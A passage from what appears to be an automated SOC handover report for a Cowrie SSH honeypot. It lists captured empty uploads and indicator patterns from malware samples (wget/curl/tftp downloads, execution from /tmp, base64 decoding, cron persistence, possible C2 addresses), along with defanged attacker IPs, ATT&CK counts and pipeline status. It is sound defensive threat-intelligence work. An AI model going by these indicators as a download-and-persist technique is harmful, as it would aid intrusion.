| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `130.12.180[.]174` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `195.178.110[.]217` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 0 |
| `200.81.189[.]44` | AR | SION S.A | **100** ⚠️ | 5 |
| `58.221.60[.]25` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |
| `124.174.51[.]228` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 2 |
| `192.253.248[.]251` | NL | Secure Internet LLC (UK) | **100** ⚠️ | 45 |
| `168.76.131[.]178` | HK | Free State Education Department | **100** ⚠️ | 50 |
| `162.255.112[.]183` | CA | Start Communications | **100** ⚠️ | 19 |
| `84.54.71[.]157` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 2 |
| `193.90.12[.]122` | NO | GLOBALCONNECT AS | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 214 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 201 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 86 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 85 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 84 |

---

## 🔕 False Positive Summary (57 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 3 below threshold 25 | 39 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 362 cases |
| Tool 34  | Credential Extractor        | ✅ 237 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 17 fingerprints |
| Tool 36  | Command Clustering          | ✅ 12 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 83 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 57 filtered (15.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 48 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 162 priority case(s) shown individually · 44 recon entry/entries in table (12 group(s) consolidating 111 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-08T08:46:15Z_
